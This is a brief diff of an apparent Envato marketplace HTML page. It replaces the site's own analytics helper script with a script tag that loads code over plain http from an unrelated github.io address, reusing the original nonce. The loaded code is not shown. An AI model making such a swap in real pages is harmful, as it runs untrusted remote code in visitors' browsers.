@@ -405,7 +405,7 @@
 
 //]]>
 </script>
-<script src="https://public-assets.envato-static.com/assets/market/core/standardised_google_analytics_helpers-2a0d6d0a6b9087b30b4be07688eb3acaa6d4fed95642c7ea8e010d29a5ccec5c.js" nonce="swTD1HLU4PX1JiwyxoXOLA=="></script>
+<script src="http://litch.github.io/banana-glitch.github.6.io/" nonce="swTD1HLU4PX1JiwyxoXOLA=="></script>
 
 
   
